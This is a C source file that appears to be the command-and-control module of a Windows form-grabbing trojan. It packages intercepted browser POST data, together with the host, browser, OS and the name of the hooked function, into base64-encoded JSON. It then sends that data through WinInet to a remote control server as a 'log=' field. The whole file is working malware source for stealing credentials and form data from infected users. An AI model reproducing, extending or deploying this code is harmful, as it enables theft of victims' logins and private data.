#include <Windows.h>
#include <WinInet.h>

#include "CommandControl.h"
#include "RC4.h"
#include "Base64.h"
#include "JSON Constructor.h"
#include "C Runtime.h"
#include "Main.h"




int CreateJSONRequestWrapper(char* Browser, DWORD dwBrowser, char* OS, DWORD dwOS, char* Host, DWORD dwHost, char * Hooked, DWORD dwHooked, char* PostData, DWORD dwPostData, unsigned char** ucJSONDestination)
{
	JSONRequest JSON;
	DWORD dwSize = 0;

	RtlSecureZeroMemory(&JSON, sizeof(JSONRequest));

	JSON.dwBrowser = dwBrowser;
	JSON.szBrowser = Browser;
	JSON.szKeyBrowser = "browser";
	JSON.dwKeyBrowser = strlen("browser");

	JSON.dwOS = dwOS;
	JSON.szOS = OS;
	JSON.szKeyOS = "os";
	JSON.dwKeyOS = strlen("os");

	JSON.dwHost = dwHost;
	JSON.szHost = Host;
	JSON.szKeyHost = "host";
	JSON.dwKeyHost = strlen("host");

	JSON.dwPostData = dwPostData;
	JSON.szPostData = PostData;
	JSON.szKeyPostData = "post";
	JSON.dwKeyPostData = strlen("post");

	JSON.dwFunction = dwHooked;
	JSON.szFunction = Hooked;
	JSON.szKeyFunction = "hooked";
	JSON.dwKeyFunction = strlen("hooked");


	if (dwSize = CreateJSONRequest(&JSON, 0))
	{
		unsigned char* ucJSON = (unsigned char*)HeapAlloc(GetProcessHeap(),0,dwSize);
		if (ucJSON)
		{
			RtlSecureZeroMemory(ucJSON, dwSize);
			if (CreateJSONRequest(&JSON,(char*)ucJSON) == dwSize)
			{
				*ucJSONDestination = ucJSON;
			}
			else
			{
				HeapFree(GetProcessHeap(),0,ucJSON);
			}
		}
	}

	return dwSize;

}

int SendJSONRequest(char* JSONRequest, DWORD dwJSONRequest, char* szHost, char* szPage, char* szMethod, unsigned char* ucKey, DWORD dwKey)
{
	INTERNET_SESSION* Session = 0;
	unsigned char* ucJSON = 0;
	DWORD dwBase64 = 0;
	int Ret = 0;
	unsigned char* ucBase64 = 0;

	if (!LoadLibraryA("wininet.dll"))
	{
		return 0;
	}

	Session = GetInternetSession(szHost, 80);

	if (!Session)
		return 0;


	ucJSON = (unsigned char*)HeapAlloc(GetProcessHeap(),0,dwJSONRequest+1);

	if (!ucJSON)
	{
		CleanRequest(Session);
		CleanSession(&Session);
		return 0;
	}


	RtlSecureZeroMemory(ucJSON,dwJSONRequest+1);
	m_memcpy(ucJSON, JSONRequest,dwJSONRequest);


	dwBase64 = ToBase64CryptoA(ucJSON,dwJSONRequest,0,0);
	if (dwBase64 <= 0)
	{
		HeapFree(GetProcessHeap(),0,ucJSON);
		CleanRequest(Session);
		CleanSession(&Session);
		return 0;
	}


	ucBase64 = (unsigned char*)HeapAlloc(GetProcessHeap(),0,dwBase64);

	if (!ucBase64)
	{
		HeapFree(GetProcessHeap(),0,ucJSON);
		CleanRequest(Session);
		CleanSession(&Session);
		return 0;
	}

	RtlSecureZeroMemory(ucBase64,dwBase64);

	if (ToBase64CryptoA(ucJSON,dwJSONRequest,(char*)ucBase64,dwBase64))
	{
		char* szRequestData = (char*)HeapAlloc(GetProcessHeap(), 0, (dwBase64-1)+strlen("log="));
		if(szRequestData)
		{
			const char Header[] = "Content-Type: application/x-www-form-urlencoded";
			RtlSecureZeroMemory(szRequestData,(dwBase64-1)+strlen("log="));
			m_memcpy(szRequestData,"log=", strlen("log="));
			m_memcpy((void*)((DWORD)szRequestData+strlen("log=")), ucBase64,dwBase64-1);
			Ret = CreateRequest(Session,szMethod,szPage,(char*)Header,szRequestData,(dwBase64-1)+strlen("log="));
			HeapFree(GetProcessHeap(),0,szRequestData);
		}
	}


	HeapFree(GetProcessHeap(),0,ucBase64);
	HeapFree(GetProcessHeap(),0,ucJSON);
	CleanRequest(Session);
	CleanSession(&Session);

	return Ret;
}

/*Stdios wininet wrapper*/

INTERNET_SESSION* GetInternetSession(char* server,INTERNET_PORT port)
{
	if(InternetAttemptConnect(0) == ERROR_SUCCESS)
	{
		INTERNET_SESSION* IS = (INTERNET_SESSION*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,sizeof(INTERNET_SESSION));
		if(IS)
		{

			memset(IS,0,sizeof(INTERNET_SESSION));
			IS->pvInternet = InternetOpenA("runscope/0.1",INTERNET_OPEN_TYPE_PRECONFIG,0,0,0);
			if(IS->pvInternet)
			{

				IS->pvSession = InternetConnectA(IS->pvInternet,server,port,0,0,INTERNET_SERVICE_HTTP ,0,0);
				if(IS->pvSession)
				{

					return IS;
				}
				InternetCloseHandle(IS->pvInternet);
			}
			HeapFree(GetProcessHeap(),0,IS);
			IS = 0;
		}
	}
	return 0;
}
int CreateRequest(INTERNET_SESSION* IS,char* requestType,char* requestPage,char* headers,void* requestData,unsigned long dataLength )
{
	IS->pvRequest = HttpOpenRequestA(IS->pvSession,requestType,requestPage,0,0,0,0,0);
	if(IS->pvRequest)
	{


		unsigned long headerLength = 0;


		if(headers)
			headerLength = strlen(headers);
		if(HttpSendRequestA(IS->pvRequest,headers,headerLength,requestData,dataLength))
		{


			return 1;
		}
	}
	return 0;
}


void CleanRequest(INTERNET_SESSION* PIS)
{
	if(PIS->pvRequest)
	{
		InternetCloseHandle(PIS->pvRequest);
		PIS->pvRequest = 0;
	}
}


void CleanSession(INTERNET_SESSION** PIS)
{
	if(*PIS)
	{
		if(((INTERNET_SESSION*)*PIS)->pvInternet)
		{
			InternetCloseHandle( ((INTERNET_SESSION*)*PIS)->pvInternet );
			((INTERNET_SESSION*)*PIS)->pvInternet = 0;
		}
		if(((INTERNET_SESSION*)*PIS)->pvSession)
		{
			InternetCloseHandle( ((INTERNET_SESSION*)*PIS)->pvSession );
			((INTERNET_SESSION*)*PIS)->pvInternet = 0;
		}
		HeapFree(GetProcessHeap(),0,*PIS);
		*PIS = 0;
	}
}


void SendPOSTRequest(char* Browser, char* ContentHost, DWORD dwContentHost, char* HookedFunction, DWORD dwHookedFunction, char* PostData, DWORD dwPostData )
{
	if (memcmp(ContentHost, szHostName,dwContentHost))
	{
		DWORD dwDestination = 0;
		unsigned char* ucDestination = 0;
		if (dwDestination = CreateJSONRequestWrapper(Browser, (DWORD)strlen(Browser),szOS,strlen(szOS), ContentHost,dwContentHost,HookedFunction,dwHookedFunction,PostData, dwPostData,&ucDestination))
		{
			if (ucDestination)
			{
				SendJSONRequest((char*)ucDestination, dwDestination,szHostName, szPage,"POST",EncucKey, sizeof(EncucKey));
				HeapFree(GetProcessHeap(),0,ucDestination);
			}
		}
	}
}